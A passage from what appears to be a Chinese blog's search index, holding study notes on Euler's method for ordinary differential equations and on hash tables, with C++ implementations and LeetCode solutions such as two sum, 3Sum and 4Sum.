欧拉法\n欧拉(Euler)法是过点P0(x0,y0)作曲线y(x)的切线y’(x0)与直线x=x1交于点P1(x1,y1)，用y1作为曲线y(x)上的点(x1,y(x1))的纵坐标y(x1)的近似值\n\n欧拉法的几何意义就是用一条初始点重合的折线来近似表示曲线y=y(x)\n通常取xx+1-xn=hn=h（常数），则欧拉法计算公式\n{yn+1=yn+hf(xn,yn)xn=x0+nh,n=0,1,…\\begin{cases}\ny_{n+1} = y_n + h f(x_n, y_n) \\\\\nx_n = x_0 + n h, \\quad n = 0, 1, \\ldots\n\\end{cases}\n{yn+1​=yn​+hf(xn​,yn​)xn​=x0​+nh,n=0,1,…​\n\n误差\n\ny(xn+1)−yn+1=h22𝑦′′(ξn)≈h22y′′(xn)y(x_{n+1})-y_{n+1}=\\frac{h^2}{2} 𝑦'' (\\xi_n) \\approx \\frac{h^2}{2} y''(x_n)\ny(xn+1​)−yn+1​=2h2​y′′(ξn​)≈2h2​y′′(xn​)\n\n后退欧拉法\n\nyn+1=yn+hf(xn+1,yn+1)y_{n+1} = y_n + h f(x_{n+1}, y_{n+1})\nyn+1​=yn​+hf(xn+1​,yn+1​)\n\n后退的欧拉公式与欧拉公式有着本质的区别，欧拉法是显式的；后退欧拉法是隐式的（且精度低，因此不常用）\n\n\n梯形法\n\nyn+1=yn+h2[f(xn,yn)+f(xn+1,yn+1)]y_{n+1}=y_n+\\frac{h}{2}[f(x_n,y_n)+f(x_{n+1},y_{n+1})]\nyn+1​=yn​+2h​[f(xn​,yn​)+f(xn+1​,yn+1​)]\n 改进欧拉法\n格式一：\n{yn+1‾=yn+hf(xn,yn)yn+1=yn+h2[f(xn,yn)+f(xn+1,yn+1‾)]y0=α,n=0,1⋯N−1\\begin{cases}\n\\overline{y_{n+1}} = y_n + h f(x_n, y_n) \\\\\ny_{n+1} = y_n + \\frac{h}{2} \\left[ f(x_n, y_n) + f(x_{n+1}, \\overline{y_{n+1}}) \\right] \\\\\ny_0 = \\alpha, \\quad n = 0, 1 \\cdots N-1\n\\end{cases}\n⎩⎪⎪⎨⎪⎪⎧​yn+1​​=yn​+hf(xn​,yn​)yn+1​=yn​+2h​[f(xn​,yn​)+f(xn+1​,yn+1​​)]y0​=α,n=0,1⋯N−1​\n格式二：\n{yp=yn+h(yn−2xnyn)yc=yn+h(yp−2xn+1yp)yn+1=12(yp+yc)\\begin{cases}\ny_p = y_n + h \\left( y_n - \\frac{2x_n}{y_n} \\right) \\\\\ny_c = y_n + h \\left( y_p - \\frac{2x_{n+1}}{y_p} \\right) \\\\\ny_{n+1} = \\frac{1}{2} (y_p + y_c)\n\\end{cases}\n⎩⎪⎪⎪⎨⎪⎪⎪⎧​yp​=yn​+h(yn​−yn​2xn​​)yc​=yn​+h(yp​−yp​2xn+1​​)yn+1​=21​(yp​+yc​)​\n\n求该常微分方程的改进欧拉公式\n{dydx=11+x2−2y2,x∈[0,2]y(0)=0\\begin{cases}\n\\frac{dy}{dx} = \\frac{1}{1+x^2} - 2y^2, \\quad x \\in [0,2] \\\\\ny(0) = 0\n\\end{cases}\n{dxdy​=1+x21​−2y2,x∈[0,2]y(0)=0​\n解：令区间长度为h=2/N\n{yn+1‾=yn+hf(xn,yn)yn+1=yn+h2[f(xn,yn)+f(xn+1,yn+1‾)]y0=0,n=0,1,…,N−1\\begin{cases}\n\\overline{y_{n+1}} = y_n + h f(x_n, y_n) \\\\\ny_{n+1} = y_n + \\frac{h}{2} \\left[ f(x_n, y_n) + f(x_{n+1}, \\overline{y_{n+1}}) \\right] \\\\\ny_0 = 0, \\quad n = 0, 1, \\ldots, N-1\n\\end{cases}\n⎩⎪⎪⎨⎪⎪⎧​yn+1​​=yn​+hf(xn​,yn​)yn+1​=yn​+2h​[f(xn​,yn​)+f(xn+1​,yn+1​​)]y0​=0,n=0,1,…,N−1​\n改进的欧拉公式为：\n{yn+1‾=yn+h(11+xn2−2yn2)yn+1=yn+h2(11+xn2−2yn2+11+xn+12−2yn+1‾2)y0=0,n=0,1,…,N−1\\begin{cases}\n\\overline{y_{n+1}} = y_n + h \\left( \\frac{1}{1+x_n^2} - 2y_n^2 \\right) \\\\\ny_{n+1} = y_n + \\frac{h}{2} \\left( \\frac{1}{1+x_n^2} - 2y_n^2 + \\frac{1}{1+x_{n+1}^2} - 2\\overline{y_{n+1}}^2 \\right) \\\\\ny_0 = 0, \\quad n = 0, 1, \\ldots, N-1\n\\end{cases}\n⎩⎪⎪⎪⎨⎪⎪⎪⎧​yn+1​​=yn​+h(1+xn2​1​−2yn2​)yn+1​=yn​+2h​(1+xn2​1​−2yn2​+1+xn+12​1​−2yn+1​​2)y0​=0,n=0,1,…,N−1​\n\n","tags":["数值分析"]},{"title":"哈希表","url":"/2025/02/10/%E5%93%88%E5%B8%8C%E8%A1%A8/","content":" 哈希表\n 定义\n根据关键码的值而直接进行访问的数据结构\n\n数组也是一张哈希表\n哈希表中关键码就是数组的索引下标，然后通过下标直接访问数组中的元素\n\n哈希表用来快速判断一个元素是否出现集合里\n 哈希函数\n以查询学生名字是否属于该学校为例，枚举的时间复杂度为O(n)，而哈希表只需O(1)。将学生姓名映射到哈希表上就涉及到了哈希函数：\n通过hashCode把名字转化为数值，一般hashcode是通过特定编码方式，可以将其他数据格式转化为不同的数值，这样就把学生名字映射为哈希表上的索引数字了\n\n\n数据规模是dataSize， 哈希表大小是tableSize\n\n对数值取模保证映射出来的索引数值都落在哈希表\n以下代码实现了一个简单哈希表。其中，将key和value封装成一个类Pair以表示键值对\n/* 键值对 */struct Pair &#123;  public:    int key;    string val;    Pair(int key, string val) &#123;        this-&gt;key = key;        this-&gt;val = val;    &#125;&#125;;/* 基于数组实现的哈希表 */class ArrayHashMap &#123;  private:    vector&lt;Pair *&gt; buckets;  public:    ArrayHashMap() &#123;        // 初始化数组，包含 100 个桶        buckets = vector&lt;Pair *&gt;(100);    &#125;    ~ArrayHashMap() &#123;        // 释放内存        for (const auto &amp;bucket : buckets) &#123;            delete bucket;        &#125;        buckets.clear();    &#125;    /* 哈希函数 */    int hashFunc(int key) &#123;        int index = key % 100;        return index;    &#125;    /* 查询操作 */    string get(int key) &#123;        int index = hashFunc(key);        Pair *pair = buckets[index];        if (pair == nullptr)            return &quot;&quot;;        return pair-&gt;val;    &#125;    /* 添加操作 */    void put(int key, string val) &#123;        Pair *pair = new Pair(key, val);        int index = hashFunc(key);        buckets[index] = pair;    &#125;    /* 删除操作 */    void remove(int key) &#123;        int index = hashFunc(key);        // 释放内存并置为 nullptr        delete buckets[index];        buckets[index] = nullptr;    &#125;    /* 获取所有键值对 */    vector&lt;Pair *&gt; pairSet() &#123;        vector&lt;Pair *&gt; pairSet;        for (Pair *pair : buckets) &#123;            if (pair != nullptr) &#123;                pairSet.push_back(pair);            &#125;        &#125;        return pairSet;    &#125;    /* 获取所有键 */    vector&lt;int&gt; keySet() &#123;        vector&lt;int&gt; keySet;        for (Pair *pair : buckets) &#123;            if (pair != nullptr) &#123;                keySet.push_back(pair-&gt;key);            &#125;        &#125;        return keySet;    &#125;    /* 获取所有值 */    vector&lt;string&gt; valueSet() &#123;        vector&lt;string&gt; valueSet;        for (Pair *pair : buckets) &#123;            if (pair != nullptr) &#123;                valueSet.push_back(pair-&gt;val);            &#125;        &#125;        return valueSet;    &#125;    /* 打印哈希表 */    void print() &#123;        for (Pair *kv : pairSet()) &#123;            cout &lt;&lt; kv-&gt;key &lt;&lt; &quot; -&gt; &quot; &lt;&lt; kv-&gt;val &lt;&lt; endl;        &#125;    &#125;&#125;;\n哈希表的可视化页面\n 哈希碰撞\n如果学生的数量大于哈希表，此时就算哈希函数计算的再均匀，也避免不了会有几位学生的名字同时映射到哈希表同一个索引下标的位置\n\n 链式地址\n将单个元素转换为链表，将键值对作为链表节点，将所有发生冲突的键值对都存储在同一链表中\n\n\n操作\n\n查询元素：输入key，经过哈希函数得到桶索引，即可访问链表头节点，然后遍历链表并对比key以查找目标键值对\n添加元素：首先通过哈希函数访问链表头节点，然后将节点（键值对）添加到链表中\n删除元素：根据哈希函数的结果访问链表头部，接着遍历链表以查找目标节点并将其删除\n\n\n局限性\n\n占用空间增大：链表包含节点指针，它相比数组更加耗费内存空间\n查询效率降低：因为需要线性遍历链表来查找对应元素\n\n\n\n/* 链式地址哈希表 */class HashMapChaining &#123;  private:    int size;                       // 键值对数量    int capacity;                   // 哈希表容量    double loadThres;               // 触发扩容的负载因子阈值    int extendRatio;                // 扩容倍数    vector&lt;vector&lt;Pair *&gt;&gt; buckets; // 桶数组  public:    /* 构造方法 */    HashMapChaining() : size(0), capacity(4), loadThres(2.0 / 3.0), extendRatio(2) &#123;        buckets.resize(capacity);    &#125;    /* 析构方法 */    ~HashMapChaining() &#123;        for (auto &amp;bucket : buckets) &#123;            for (Pair *pair : bucket) &#123;                // 释放内存                delete pair;            &#125;        &#125;    &#125;    /* 哈希函数 */    int hashFunc(int key) &#123;        return key % capacity;    &#125;    /* 负载因子 */    double loadFactor() &#123;        return (double)size / (double)capacity;    &#125;    /* 查询操作 */    string get(int key) &#123;        int index = hashFunc(key);        // 遍历桶，若找到 key ，则返回对应 val        for (Pair *pair : buckets[index]) &#123;            if (pair-&gt;key == key) &#123;                return pair-&gt;val;            &#125;        &#125;        // 若未找到 key ，则返回空字符串        return &quot;&quot;;    &#125;    /* 添加操作 */    void put(int key, string val) &#123;        // 当负载因子超过阈值时，执行扩容        if (loadFactor() &gt; loadThres) &#123;            extend();        &#125;        int index = hashFunc(key);        // 遍历桶，若遇到指定 key ，则更新对应 val 并返回        for (Pair *pair : buckets[index]) &#123;            if (pair-&gt;key == key) &#123;                pair-&gt;val = val;                return;            &#125;        &#125;        // 若无该 key ，则将键值对添加至尾部        buckets[index].push_back(new Pair(key, val));        size++;    &#125;    /* 删除操作 */    void remove(int key) &#123;        int index = hashFunc(key);        auto &amp;bucket = buckets[index];        // 遍历桶，从中删除键值对        for (int i = 0; i &lt; bucket.size(); i++) &#123;            if (bucket[i]-&gt;key == key) &#123;                Pair *tmp = bucket[i];                bucket.erase(bucket.begin() + i); // 从中删除键值对                delete tmp;                       // 释放内存                size--;                return;            &#125;        &#125;    &#125;    /* 扩容哈希表 */    void extend() &#123;        // 暂存原哈希表        vector&lt;vector&lt;Pair *&gt;&gt; bucketsTmp = buckets;        // 初始化扩容后的新哈希表        capacity *= extendRatio;        buckets.clear();        buckets.resize(capacity);        size = 0;        // 将键值对从原哈希表搬运至新哈希表        for (auto &amp;bucket : bucketsTmp) &#123;            for (Pair *pair : bucket) &#123;                put(pair-&gt;key, pair-&gt;val);                // 释放内存                delete pair;            &#125;        &#125;    &#125;    /* 打印哈希表 */    void print() &#123;        for (auto &amp;bucket : buckets) &#123;            cout &lt;&lt; &quot;[&quot;;            for (Pair *pair : bucket) &#123;                cout &lt;&lt; pair-&gt;key &lt;&lt; &quot; -&gt; &quot; &lt;&lt; pair-&gt;val &lt;&lt; &quot;, &quot;;            &#125;            cout &lt;&lt; &quot;]\\n&quot;;        &#125;    &#125;&#125;;\n 开放寻址\n不引入额外的数据结构，而是通过多次探测来处理哈希冲突，探测方式主要包括线性探测、平方探测和多次哈希等\n开放寻址哈希表都存在不能直接删除元素的问题\n 线性探测\n\n前提：tableSize&gt;dataSize。需要依靠哈希表中的空位来解决碰撞问题\n\n采用固定步长的线性搜索来进行探测\n\n插入元素：通过哈希函数计算桶索引，若发现桶内已有元素，则从冲突位置向后线性遍历（步长通常为1），直至找到空桶，将元素插入其中\n查找元素：若发现哈希冲突，则使用相同步长向后进行线性遍历，直到找到对应元素，返回value即可；如果遇到空桶，说明目标元素不在哈希表中，返回None\n\n\n\n局限\n\n线性探测容易产生聚集现象\n\n数组中连续被占用的位置越长，这些连续位置发生哈希冲突的可能性越大，从而进一步促使该位置的聚堆生长，形成恶性循环，最终导致增删查改操作效率劣化\n\n不能在开放寻址哈希表中直接删除元素\n\n删除元素会在数组内产生一个空桶None，而当查询元素时，线性探测到该空桶就会返回，因此在该空桶之下的元素都无法再被访问到，程序可能误判这些元素不存在\n可以采用懒删除机制：它不直接从哈希表中移除元素，而是利用一个常量TOMBSTONE来标记这个桶。该机制下，None和TOMBSTONE都代表空桶，都可以放置键值对。但不同的是，线性探测到TOMBSTONE时应该继续遍历，因为其之下可能还存在键值对\n懒删除可能会加速哈希表的性能退化。这是因为每次删除操作都会产生一个删除标记，随着TOMBSTONE的增加，搜索时间也会增加，因为线性探测可能需要跳过多个TOMBSTONE才能找到目标元素\n为此，考虑在线性探测中记录遇到的首个TOMBSTONE的索引，并将搜索到的目标元素与该TOMBSTONE交换位置。这样做的好处是当每次查询或添加元素时元素会被移动至距离理想位置（探测起始点）更近的桶，从而优化查询效率\n\n/* 开放寻址哈希表 */class HashMapOpenAddressing &#123;  private:    int size;                             // 键值对数量    int capacity = 4;                     // 哈希表容量    const double loadThres = 2.0 / 3.0;     // 触发扩容的负载因子阈值    const int extendRatio = 2;            // 扩容倍数    vector&lt;Pair *&gt; buckets;               // 桶数组    Pair *TOMBSTONE = new Pair(-1, &quot;-1&quot;); // 删除标记  public:    /* 构造方法 */    HashMapOpenAddressing() : size(0), buckets(capacity, nullptr) &#123;    &#125;    /* 析构方法 */    ~HashMapOpenAddressing() &#123;        for (Pair *pair : buckets) &#123;            if (pair != nullptr &amp;&amp; pair != TOMBSTONE) &#123;                delete pair;            &#125;        &#125;        delete TOMBSTONE;    &#125;    /* 哈希函数 */    int hashFunc(int key) &#123;        return key % capacity;    &#125;    /* 负载因子 */    double loadFactor() &#123;        return (double)size / capacity;    &#125;    /* 搜索 key 对应的桶索引 */    int findBucket(int key) &#123;        int index = hashFunc(key);        int firstTombstone = -1;        // 线性探测，当遇到空桶时跳出        while (buckets[index] != nullptr) &#123;            // 若遇到 key ，返回对应的桶索引            if (buckets[index]-&gt;key == key) &#123;                // 若之前遇到了删除标记，则将键值对移动至该索引处                if (firstTombstone != -1) &#123;                    buckets[firstTombstone] = buckets[index];                    buckets[index] = TOMBSTONE;                    return firstTombstone; // 返回移动后的桶索引                &#125;                return index; // 返回桶索引            &#125;            // 记录遇到的首个删除标记            if (firstTombstone == -1 &amp;&amp; buckets[index] == TOMBSTONE) &#123;                firstTombstone = index;            &#125;            // 计算桶索引，越过尾部则返回头部            index = (index + 1) % capacity;        &#125;        // 若 key 不存在，则返回添加点的索引        return firstTombstone == -1 ? index : firstTombstone;    &#125;    /* 查询操作 */    string get(int key) &#123;        // 搜索 key 对应的桶索引        int index = findBucket(key);        // 若找到键值对，则返回对应 val        if (buckets[index] != nullptr &amp;&amp; buckets[index] != TOMBSTONE) &#123;            return buckets[index]-&gt;val;        &#125;        // 若键值对不存在，则返回空字符串        return &quot;&quot;;    &#125;    /* 添加操作 */    void put(int key, string val) &#123;        // 当负载因子超过阈值时，执行扩容        if (loadFactor() &gt; loadThres) &#123;            extend();        &#125;        // 搜索 key 对应的桶索引        int index = findBucket(key);        // 若找到键值对，则覆盖 val 并返回        if (buckets[index] != nullptr &amp;&amp; buckets[index] != TOMBSTONE) &#123;            buckets[index]-&gt;val = val;            return;        &#125;        // 若键值对不存在，则添加该键值对        buckets[index] = new Pair(key, val);        size++;    &#125;    /* 删除操作 */    void remove(int key) &#123;        // 搜索 key 对应的桶索引        int index = findBucket(key);        // 若找到键值对，则用删除标记覆盖它        if (buckets[index] != nullptr &amp;&amp; buckets[index] != TOMBSTONE) &#123;            delete buckets[index];            buckets[index] = TOMBSTONE;            size--;        &#125;    &#125;    /* 扩容哈希表 */    void extend() &#123;        // 暂存原哈希表        vector&lt;Pair *&gt; bucketsTmp = buckets;        // 初始化扩容后的新哈希表        capacity *= extendRatio;        buckets = vector&lt;Pair *&gt;(capacity, nullptr);        size = 0;        // 将键值对从原哈希表搬运至新哈希表        for (Pair *pair : bucketsTmp) &#123;            if (pair != nullptr &amp;&amp; pair != TOMBSTONE) &#123;                put(pair-&gt;key, pair-&gt;val);                delete pair;            &#125;        &#125;    &#125;    /* 打印哈希表 */    void print() &#123;        for (Pair *pair : buckets) &#123;            if (pair == nullptr) &#123;                cout &lt;&lt; &quot;nullptr&quot; &lt;&lt; endl;            &#125; else if (pair == TOMBSTONE) &#123;                cout &lt;&lt; &quot;TOMBSTONE&quot; &lt;&lt; endl;            &#125; else &#123;                cout &lt;&lt; pair-&gt;key &lt;&lt; &quot; -&gt; &quot; &lt;&lt; pair-&gt;val &lt;&lt; endl;            &#125;        &#125;    &#125;&#125;;\n 平方探测\n发生冲突时，平方探测跳过“探测次数的平方”的步数，即1、4、9…步\n\n优势\n\n平方探测通过跳过探测次数平方的距离，试图缓解线性探测的聚集效应\n平方探测会跳过更大的距离来寻找空位置，有助于数据分布得更加均匀\n\n局限\n\n仍然存在聚集现象，即某些位置比其他位置更容易被占用\n由于平方的增长，平方探测可能不会探测整个哈希表，这意味着即使哈希表中有空桶，平方探测也可能无法访问到它\n 多次哈希\n使用多个哈希函数f1(x)、f2(x)、f3(x)…进行探测\n\n插入元素：若哈希函数f1(x)出现冲突，则尝试f2(x)，以此类推，直到找到空位后插入元素\n查找元素：在相同的哈希函数顺序下进行查找，直到找到目标元素时返回；若遇到空位或已尝试所有哈希函数，说明哈希表中不存在该元素，则返回None\n\n多个哈希函数会带来额外的计算量\n 常见的三种哈希结构\n\n数组\nset （集合）\nmap（映射）\n\n\nmap的空间消耗比数组大一些，因为map要维护红黑树或者哈希表，而且还要做哈希函数，会更加费时\n\n set\n使用集合来解决哈希问题优先使用unordered_set\n\n它的查询和增删效率是最优的\n\n集合有序用set\n集合不仅有序还有重复数据用multiset\n\n\n\n集合\n底层实现\n是否有序\n数值是否可以重复\n能否更改数值\n查询效率\n增删效率\n\n\n\n\nstd::set\n红黑树\n有序\n否\n否\nO(logn)\nO(logn)\n\n\nstd::multiset\n红黑树\n有序\n是\n否\nO(logn)\nO(logn)\n\n\nstd::unordered_set\n哈希表\n无序\n否\n否\nO(1)\nO(1)\n\n\n\nstd::unordered_set底层实现为哈希表，std::set和std::multiset的底层实现是红黑树\n\n红黑树是一种平衡二叉搜索树，所以key值是有序的，但key不可以修改，改动key值会导致整棵树的错乱，所以只能删除和增加\n\n虽然std::set和std::multiset的底层实现基于红黑树而非哈希表，它们通过红黑树来索引和存储数据。不过给我们的使用方式，还是哈希法的使用方式，即依靠键（key）来访问值（value）。所以使用这些数据结构来解决映射问题的方法，我们依然称之为哈希法。std::map也是一样的道理\n\nQ：hash_set、hash_map与unordered_set、unordered_map的关系？\nA：实际功能一样，但是unordered_set在C++11的时候被引入标准库了，而hash_set并没有，所以建议还是使用unordered_set比较好，这就好比一个是官方认证的，hash_set，hash_map是C++11标准之前民间高手自发造的轮子\n\n\n map\n\n\n\n映射\n底层实现\n是否有序\n数值是否可以重复\n能否更改数值\n查询效率\n增删效率\n\n\n\n\nstd::map\n红黑树\nkey有序\nkey不可重复\nkey不可修改\nO(logn)\nO(logn)\n\n\nstd::multimap\n红黑树\nkey有序\nkey可重复\nkey不可修改\nO(logn)\nO(logn)\n\n\nstd::unordered_map\n哈希表\nkey无序\nkey不可重复\nkey不可修改\nO(1)\nO(1)\n\n\n\nstd::unordered_map底层实现为哈希表，std::map和std::multimap的底层实现是红黑树\n同理，std::map和std::multimap的key也是有序的\nmap是一个key value的数据结构，map中对key有限制，对value没有限制\n\n因为key的存储方式使用红黑树实现的\n\nunordered_map的迭代器iterator遍历容器中的键值对。迭代器指向的是一个键值对（pair），可以通过迭代器访问键和值：\n\niter-&gt;first：表示键（key）\niter-&gt;second：表示值（value）\n\n 总结\n数据小用数组，数据大用set，数据比较散用map\n遇到了要快速判断一个元素是否出现集合里的时候，就要考虑哈希法\n哈希法牺牲了空间换取了时间\n\n因为要用额外的数组set或map来存数据才能实现快速查找\n\n 有效的字母异位词\n242. 有效的字母异位词\n\n字母异位词：通过重新排列不同单词或短语的字母而形成的单词或短语，并使用所有原字母一次\n同分异构体\n\n\nclass Solution &#123;public:    bool isAnagram(string s, string t) &#123;        int record[26]=&#123;0&#125;;        for(int i=0;i&lt;s.size();i++)&#123;            record[s[i]-&#x27;a&#x27;]++;        &#125;        for(int i=0;i&lt;s.size();i++)&#123;            record[t[i]-&#x27;a&#x27;]--;        &#125;        for(int i=0;i&lt;26;i++)&#123;            if(record[i]!=0)&#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 两个数组的交集\n349. 两个数组的交集\n题目特意说明：输出结果中的每个元素一定是唯一的，即输出的结果的去重的且可不考虑输出结果的顺序\nunordered_set\n范围for循环\nclass Solution &#123;public:    vector&lt;int&gt; intersection(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;        unordered_set&lt;int&gt; result_set;        unordered_set&lt;int&gt; nums_set(nums1.begin(),nums1.end());        for(int num:nums2)&#123;            //发现nums2的元素在nums_set里又出现过            if(nums_set.find(num)!=nums_set.end())&#123;                result_set.insert(num);            &#125;        &#125;        return vector&lt;int&gt;(result_set.begin(),result_set.end());    &#125;&#125;;\n\n时间复杂度：O(n+m)，m是最后要把set转成vector\n空间复杂度：O(n)\n\n 快乐数\n202. 快乐数\n\n\n快乐数\n\n对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和，然后重复这个过程直到这个数变为1，也可能是无限循环但始终变不到1。如果可以变为1，那么这个数就是快乐数\n\n无限循环说明求和的过程中sum会重复出现\n使用哈希法判断sum是否重复出现，如果重复return false， 否则一直找到sum为1为止\nclass Solution &#123;public:    bool isHappy(int n) &#123;        unordered_set&lt;int&gt; set;        while(true)&#123;            int sum=GetSum(n);            if(sum==1)&#123;                return true;            &#125;            //sum曾经出现过说明已陷入死循环            if(set.find(sum)!=set.end())&#123;                return false;            &#125;else&#123;                set.insert(sum);            &#125;            n=sum;        &#125;    &#125;    int GetSum(int n)&#123;        int sum=0;        while(n)&#123;            sum+=(n%10)*(n%10);            n/=10;        &#125;        return sum;    &#125;&#125;;\n\n时间复杂度：O(logn)\n空间复杂度：O(logn)\n\n 两数之和\n1. 两数之和\n本题不仅要知道元素有没有遍历过，还要知道这个元素对应的下标，需要使用key value结构来存放，key存元素，value存下标，那么使用map正合适\n\n\n此题数组&amp;set的局限\n\n数组大小受限制，且若元素很少，而哈希值太大会造成内存空间的浪费\nset是一个集合，里面放的元素只能是一个key，而此题不仅要判断y是否存在且还要记录y的下标位置，因为要返回x和y的下标，所以set也不能用\n\n\n\niterator\nclass Solution &#123;public:    vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;        unordered_map&lt;int,int&gt; map;        for(int i=0;i&lt;nums.size();i++)&#123;            unordered_map&lt;int, int&gt;::iterator iter=map.find(target-nums[i]);            if(iter!=map.end())&#123;                return &#123;iter-&gt;second,i&#125;;             &#125;            map.insert(pair&lt;int,int&gt;(nums[i],i));        &#125;        return &#123;&#125;;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 四数相加II\n454. 四数相加 II\nkey：a+b的数值，value：a+b数值出现的次数\ncount：统计a+b+c+d=0出现的次数\nclass Solution &#123;public:    int fourSumCount(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2, vector&lt;int&gt;&amp; nums3, vector&lt;int&gt;&amp; nums4) &#123;        unordered_map&lt;int,int&gt; umap;        for(int a:nums1)&#123;            for(int b:nums2)&#123;                umap[a+b]++;            &#125;        &#125;        int count=0;        for(int c:nums3)&#123;            for(int d:nums4)&#123;                if(umap.find(0-(c+d))!=umap.end())&#123;                    count+=umap[0-(c+d)];                &#125;            &#125;        &#125;        return count;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(n2)，最坏情况下A和B的值各不相同，相加产生的数字个数为n2\n\n 赎金信\n383. 赎金信\n\n“为了不暴露赎金信字迹，要从杂志上搜索各个需要的字母，组成单词来表达意思”这里说明杂志里面的字母不可重复使用\n“你可以假设两个字符串均只含有小写字母”说明只有小写字母\n\n 暴力法\nclass Solution &#123;public:    bool canConstruct(string ransomNote, string magazine) &#123;        for(int i=0;i&lt;magazine.length();i++)&#123;            for(int j=0;j&lt;ransomNote.length();j++)&#123;                if(magazine[i]==ransomNote[j])&#123;                    ransomNote.erase(ransomNote.begin()+j);                    break;                &#125;            &#125;        &#125;        if(ransomNote.length()==0)&#123;            return true;        &#125;        return false;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(1)\n\n 哈希法\n只有小写字母，则可以空间换时间，用长度26的数组记录magazine里字母出现的次数\n再用ransomNote验证数组是否包含ransomNote所需要的字母\nclass Solution &#123;public:    bool canConstruct(string ransomNote, string magazine) &#123;        int record[26]=&#123;0&#125;;        if(ransomNote.size()&gt;magazine.size())&#123;            return false;        &#125;        for(int i=0;i&lt;magazine.length();i++)&#123;            record[magazine[i]-&#x27;a&#x27;]++;        &#125;        for(int j=0;j&lt;ransomNote.length();j++)&#123;            record[ransomNote[j]-&#x27;a&#x27;]--;            if(record[ransomNote[j]-&#x27;a&#x27;]&lt;0)&#123;                return false;            &#125;        &#125;        return true;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 三数之和\n15. 三数之和\n三元组不重复，但是三元组里面的元素可以重复： {0,0,0}\nnums[i]==nums[i-1]：{-1,-1,2}\n\n如果是nums[i]与nums[i+1]\n此时把三元组中出现重复元素的情况直接pass掉了。如{-1,-1,2}这组数据，当遍历到第一个-1的时候，判断下一个也是-1，那这组数据就pass了\n\n 哈希法\nvector&lt;vector&lt;int&gt;&gt; result\n\n剪枝：减少搜索空间，提高算法的效率\n\nclass Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;        vector&lt;vector&lt;int&gt;&gt; result;        sort(nums.begin(),nums.end());        for(int i=0;i&lt;nums.size();i++)&#123;            if(nums[i]&gt;0)&#123;//第一个最小的元素都大于0，则后面的数不可能三个数相加为0                break;            &#125;            if(i&gt;0&amp;&amp;nums[i]==nums[i-1])&#123;                continue;            &#125;            unordered_set&lt;int&gt; set;            for(int k=i+1;k&lt;nums.size();k++)&#123;                if(k&gt;i+2&amp;&amp;nums[k]==nums[k-1]&amp;&amp;nums[k-1]==nums[k-2])&#123;                    continue;                &#125;                int target=0-(nums[i]+nums[k]);                if(set.find(target)!=set.end())&#123;                    result.push_back(&#123;nums[i],target,nums[k]&#125;);                    set.erase(target);                &#125;else&#123;                    set.insert(nums[k]);                &#125;            &#125;        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(n)，额外的set开销\n\n 双指针法\n这道题目使用双指针法要比哈希法高效\n\n将数组排序，这里相当于a=nums[i]，b=nums[left]，c=nums[right]\nclass Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;        vector&lt;vector&lt;int&gt;&gt; result;        sort(nums.begin(),nums.end());        for(int i=0;i&lt;nums.size();i++)&#123;            if(nums.size()&lt;3||nums[i]&gt;0)&#123;                break;            &#125;            if(i&gt;0&amp;&amp;nums[i]==nums[i-1])&#123;                continue;            &#125;            int left=i+1;            int right=nums.size()-1;            while(right&gt;left)&#123;                if(nums[i]+nums[left]+nums[right]&gt;0)&#123;                    right--;                &#125;else if(nums[i]+nums[left]+nums[right]&lt;0)&#123;                    left++;                &#125;else&#123;                    result.push_back(vector&lt;int&gt;&#123;nums[i],nums[left],nums[right]&#125;);                    //0 -1 -1 -1 -1 1 1 1 1                    //i  l                r                    //去重的逻辑一定要放在收获结果的下面，即至少要收获一个符合条件的结果                    while(right&gt;left&amp;&amp;nums[right]==nums[right-1])&#123;                        right--;                    &#125;                    while(right&gt;left&amp;&amp;nums[left]==nums[left+1])&#123;                        left++;                    &#125;                    right--;                    left++;                &#125;            &#125;        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n2)\n空间复杂度：O(logn)排序额外使用了空间\n\n 四数之和\n18. 四数之和\n 双指针法\n在三数之和基础上多加一层循环及一级二级剪枝、去重\nclass Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; fourSum(vector&lt;int&gt;&amp; nums, int target) &#123;        vector&lt;vector&lt;int&gt;&gt; result;        sort(nums.begin(),nums.end());        for(int k=0;k&lt;nums.size();k++)&#123;            if(nums[k]&gt;target&amp;&amp;nums[k]&gt;=0)&#123;//traget可能为负数                break;            &#125;            if(k&gt;0&amp;&amp;nums[k]==nums[k-1])&#123;                continue;            &#125;            for(int i=k+1;i&lt;nums.size();i++)&#123;                if(nums[k]+nums[i]&gt;target&amp;&amp;nums[k]+nums[i]&gt;=0)&#123;                    break;                &#125;                if(i&gt;k+1&amp;&amp;nums[i]==nums[i-1])&#123;//对nums[i]去重                    continue;                &#125;                int left=i+1;                int right=nums.size()-1;                while(right&gt;left)&#123;                    if(nums[k]+nums[i]+nums[left]+nums[right]&gt;target)&#123;                        right--;                    &#125;else if(nums[k]+nums[i]+nums[left]+nums[right]&lt;target)&#123;                        left++;                    &#125;else&#123;                        result.push_back(vector&lt;int&gt;&#123;nums[k],nums[i],nums[left],nums[right]&#125;);                        //对nums[left]和nums[right]去重                        while(right&gt;left&amp;&amp;nums[right]==nums[right-1])&#123;                            right--;                        &#125;                        while(right&gt;left&amp;&amp;nums[left]==nums[left+1])&#123;                            left++;                        &#125;                        right--;                        left++;                    &#125;                &#125;            &#125;        &#125;        return result;    &#125;&#125;;\n\n时间复杂度：O(n3)\n空间复杂度：O(logn)排序额外使用了空间\n\n","tags":["LeetCode"]},{"title":"数组","url":"/2025/01/24/%E6%95%B0%E7%BB%84/","content":" 前言\n根据代码随想录使用C++循序渐进学算法\n时间复杂度计算\n 数组\n 二分查找\n704. 